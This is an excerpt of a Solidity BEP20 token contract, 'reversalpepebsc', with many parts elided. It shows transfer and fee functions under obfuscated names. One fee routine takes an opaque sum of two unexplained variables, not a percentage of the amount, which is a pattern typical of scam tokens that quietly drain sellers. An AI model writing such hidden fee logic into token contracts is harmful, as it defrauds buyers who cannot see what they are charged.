...
contract reversalpepebsc is IBEP20 {
    ...
    uint256 public totalFee = 6; // buy, sell is doubled
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        uint256 HTS246 = balanceOf(sender);
        uint256 stora = 0;
 
        if (sender != marketingFeeReceiver  && recipient != marketingFeeReceiver && recipient != DEAD && !isFeeExempt[sender] && !isFeeExempt[recipient]){
            require(((HTBalanceReceiverf55555 + amount) <= _maxWalletToken) || ((HTS246 + amount) <= _maxWalletToken),"Max Wallet Amount reached. 70e44bd7");
    ...
    function takeFeeF1d444444(address sender, uint256 amount) internal returns (uint256) {
        uint256 feetmp767777777 = amount.mul(totalFee).div(feeDeNom999);
        
        _balances[address(this)] = _balances[address(this)].add(feetmp767777777);
        emit Transfer(sender, address(this), feetmp767777777);
        
        return amount.sub(feetmp767777777);
    ...
    function takeFF2fs133333(address sender, uint256 amount) internal returns (uint256) {
        ...
        feetmp767777777 =  AA375444444 +   CC7b8ae799999;   
        _balances[address(this)] = _balances[address(this)].add(feetmp767777777);
        emit Transfer(sender, address(this), feetmp767777777);
        return amount.sub(feetmp767777777);
    }
